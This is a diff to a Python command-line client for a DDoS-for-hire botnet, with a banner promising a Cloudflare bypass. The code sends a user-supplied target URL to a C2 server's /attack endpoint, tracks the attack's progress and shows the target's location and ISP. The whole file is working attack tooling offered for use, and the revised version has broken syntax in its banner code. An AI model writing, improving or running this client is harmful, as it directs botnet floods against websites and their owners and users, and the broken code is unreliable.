@@ -24,80 +24,106 @@ def L():
 ⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
 ⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
     """, style="bold magenta"))
-console.print(
-    Panel.fit(
-        "DDOS C2 BOTNET DIZ FLYZE ONLY BYPASS CLOUDFLARE",
-        style="bold yellow",
-        padding=(1, 2),  
-        subtitle_align="center"  
-    ),
-    justify="center"  
-)
+    console.print(
+        Panel.fit(
+            "DDOS C2 BOTNET DIZ FLYZE ONLY BYPASS CLOUDFLARE",
+            style="bold yellow",
+            padding=(1, 2),
+        justify="center"
+    )
 
-def NU(user_input):
-    if not re.match(r'^https?://', user_input):
-        user_input = 'https://' + user_input
-    parsed = urlparse(user_input)
-    if not parsed.netloc:
-        parsed = parsed._replace(netloc=parsed.path, path='')
-    return urlunparse(parsed)
-
-def SA(api_url, target):
+def get_ip_info(target):
     try:
-        with console.status("[bold green][ ATTACKING ]", spinner="dots12"):
-            info_response = requests.get(f"{api_url}/info?target={target}")
-            if info_response.status_code != 200:
-                console.print(f"[bold red][ ERROR ] : {info_response.json().get('error', 'Gagal mendapatkan info')}")
-                return None
-            info = info_response.json()
-            response = requests.post(
-                f"{api_url}/attack",
-                json={"target": target, "apiKey": "TERMUX_KEY"}
-            )
-            if response.status_code != 200:
-                console.print(f"[bold red][ ERROR ] : {response.json().get('error', 'Gagal attack')}")
-                return None
-            return info
-    except Exception as e:
-        console.print(f"[bold red] [ GAGAL TERHUBUNG ] : {str(e)}")
+        hostname = urlparse(target).hostname
+        response = requests.get(f"http://ip-api.com/json/{hostname}")
+        return response.json() if response.status_code == 200 else None
+    except:
+        return None
+
+def track_attack(api_url, attack_id, duration):
+    with Progress() as progress:
+        task = progress.add_task("[bold red] [ PROGRESS ]", total=100)
+        start_time = time.time()
+        
+        while True:
+            try:
+                response = requests.get(f"{api_url}/status/{attack_id}")
+                if response.status_code == 200:
+                    data = response.json()
+                    progress.update(task, completed=data['progress'])
+                    if data['completed']:
+                        return True
+                else:
+                    elapsed = time.time() - start_time
+                    progress.update(task, completed=min((elapsed/duration)*100, 100))
+                    
+                if (time.time() - start_time) > duration:
+                    return True
+                    
+                time.sleep(1)
+            except:
+                if (time.time() - start_time) > duration:
+                    return True
+                time.sleep(1)
+
+def start_attack(api_url, target):
+    try:
+        response = requests.post(
+            f"{api_url}/attack",
+            json={"target": target, "apiKey": "TERMUX_KEY"}
+        )
+        return response.json() if response.status_code == 200 else None
+    except:
         return None
 
 def SR(info):
     table = Table.grid(expand=True)
     table.add_column(style="cyan", width=20)
     table.add_column(style="magenta")
-    table.add_row("Target", info.get('query', '-'))
-    table.add_row("Lokasi", f"{info.get('city', '-')}, {info.get('country', '-')}")
-    table.add_row("ISP", info.get('isp', '-'))
-    table.add_row("Organisasi", info.get('org', '-'))
-    table.add_row("ASN", info.get('as', '-'))
-    table.add_row("Zona Waktu", info.get('timezone', '-'))
-    table.add_row("Koordinat", f"Lat: {info.get('lat', '-')}, Lon: {info.get('lon', '-')}")
-    table.add_row("Status", "[bold green]SUCCESSFULY[/]")
+    
+    info_fields = {
+        'query': 'Target',
+        'country': 'Country',
+        'city': 'City',
+        'isp': 'ISP',
+        'org': 'Organization',
+        'as': 'ASN',
+        'timezone': 'Timezone'
+    }
+    
+    for field, label in info_fields.items():
+        table.add_row(label, info.get(field, '-'))
+    
     console.print(Panel.fit(
         table,
-        title="[bold yellow][ BOTNET C2 ]",
-        subtitle="[bold yellow][ C2 SUKSES ]",
-        style="bold white"
-    ))
+        title="[bold yellow][ ATTACK DETAILS ]",
+        style="bold white",
+        padding=(1, 2)
+    )
 
 def main():
     L()
     api_url = console.input("[bold white]╔═(api)Dizflyze Apikey)\n╚═══➤ ")
+    
     L()
-    target_input = console.input("[bold white]╔═(link)Dizflyze Streser)\n╚═══➤ ")
-    target = NU(target_input)
+    target = console.input("[bold white]╔═(link)Dizflyze Streser)\n╚═══➤ ")
+    target = requests.utils.quote(target, safe=':/')
+    
     L()
-    with Progress(transient=True) as progress:
-        task = progress.add_task("[bold red] [ ATTACKING ]", total=100)
-        info = SA(api_url, target)
-        if not info:
-            return
-        for i in range(100):
-            progress.update(task, advance=1, description=f"[bold yellow][ STATUS ] : ({i+1}%)")
-            time.sleep(2)
-    L()
-    SR(info)
+    ip_info = get_ip_info(target)
+    if not ip_info:
+        console.print("[bold red] [ GAGAL MENDAPATKAN INFO TARGET ]")
+        return
+    
+    attack_data = start_attack(api_url, target)
+    if not attack_data:
+        console.print("[bold red] [ GAGAL MEMULAI SERANGAN ]")
+        return
+    
+    if track_attack(api_url, attack_data['attackId'], attack_data['duration']):
+        L()
+        SR(ip_info)
+        console.print(f"\n[bold green]✓ SERANGAN BERHASIL DIKIRIM KE {target}")
 
 if __name__ == "__main__":
     main()
